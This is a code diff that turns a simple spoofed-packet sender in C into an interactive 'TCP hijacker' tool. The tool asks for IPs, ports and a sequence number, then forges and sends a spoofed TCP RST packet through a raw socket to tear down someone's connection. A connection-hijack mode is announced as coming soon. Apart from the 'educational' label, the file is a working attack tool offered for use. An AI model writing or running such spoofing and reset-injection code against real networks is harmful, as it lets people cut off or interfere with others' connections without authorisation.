@@ -1,4 +1,7 @@
-// tcp_hijack.c
+// tcp_hijacker.c
+// Educational TCP connection disruptor and hijacker
+// For FreeBSD/Linux - use with root privileges only
+
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -7,8 +10,9 @@
 #include <arpa/inet.h>
 #include <netinet/tcp.h>
 #include <netinet/ip.h>
+#include <netinet/in.h>
+#include <errno.h>
 
-// Pseudo header needed for TCP checksum calculation
 struct pseudo_header {
     u_int32_t source_address;
     u_int32_t dest_address;
@@ -17,7 +21,6 @@ struct pseudo_header {
     u_int16_t tcp_length;
 };
 
-// Checksum function
 unsigned short csum(unsigned short *ptr, int nbytes) {
     register long sum;
     unsigned short oddbyte;
@@ -38,13 +41,13 @@ unsigned short csum(unsigned short *ptr, int nbytes) {
     sum += (sum >> 16);
     answer = (short)~sum;
 
-    return (answer);
+    return answer;
 }
 
-int main() {
+void send_rst_packet(char *source_ip, char *dest_ip, int source_port, int dest_port, uint32_t seq) {
     int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if (s == -1) {
-        perror("Socket error");
+    if (s < 0) {
+        perror("Socket creation failed");
         exit(1);
     }
 
@@ -56,15 +59,10 @@ int main() {
     struct sockaddr_in sin;
     struct pseudo_header psh;
 
-    // Spoofed IPs
-    char source_ip[32] = "192.168.0.100";
-    char dest_ip[32] = "192.168.0.1";
-
     sin.sin_family = AF_INET;
-    sin.sin_port = htons(23);  // Telnet for example
+    sin.sin_port = htons(dest_port);
     sin.sin_addr.s_addr = inet_addr(dest_ip);
 
-    // Fill in IP Header
     iph->ihl = 5;
     iph->version = 4;
     iph->tos = 0;
@@ -79,18 +77,16 @@ int main() {
 
     iph->check = csum((unsigned short *) datagram, iph->tot_len);
 
-    // TCP Header
-    tcph->source = htons(1234); // arbitrary
-    tcph->dest = htons(23);
-    tcph->seq = htonl(0);
-    tcph->ack_seq = htonl(0);
+    tcph->source = htons(source_port);
+    tcph->dest = htons(dest_port);
+    tcph->seq = htonl(seq);
+    tcph->ack_seq = 0;
     tcph->doff = 5;
-    tcph->syn = 1;
+    tcph->rst = 1;
     tcph->window = htons(5840);
     tcph->check = 0;
     tcph->urg_ptr = 0;
 
-    // Pseudo header for checksum
     psh.source_address = inet_addr(source_ip);
     psh.dest_address = inet_addr(dest_ip);
     psh.placeholder = 0;
@@ -100,25 +96,55 @@ int main() {
     int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
     char *pseudogram = malloc(psize);
 
-    memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
+    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
     memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
 
     tcph->check = csum((unsigned short *) pseudogram, psize);
 
-    // Tell kernel we provide the IP header
     int one = 1;
     if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
-        perror("Error setting IP_HDRINCL");
+        perror("setsockopt");
         exit(1);
     }
 
-    // Send packet
-    if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0) {
-        perror("sendto failed");
+    if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
+        perror("sendto");
     } else {
-        printf("Packet sent.\n");
+        printf("[+] RST packet sent to disrupt connection.\n");
     }
 
     free(pseudogram);
+    close(s);
+}
+
+int main() {
+    char source_ip[32], dest_ip[32];
+    int source_port, dest_port;
+    uint32_t seq;
+
+    int mode;
+    printf("\nTCP Hijacker (Educational)\n");
+    printf("1. Disrupt connection\n2. Hijack connection (not yet implemented)\nChoose mode: ");
+    scanf("%d", &mode);
+
+    printf("Enter source IP: ");
+    scanf("%s", source_ip);
+    printf("Enter destination IP: ");
+    scanf("%s", dest_ip);
+    printf("Enter source port: ");
+    scanf("%d", &source_port);
+    printf("Enter destination port: ");
+    scanf("%d", &dest_port);
+    printf("Enter SEQ number to use: ");
+    scanf("%u", &seq);
+
+    if (mode == 1) {
+        send_rst_packet(source_ip, dest_ip, source_port, dest_port, seq);
+    } else if (mode == 2) {
+        printf("Hijack mode coming soon...\n");
+    } else {
+        printf("Invalid mode.\n");
+    }
+
     return 0;
 }
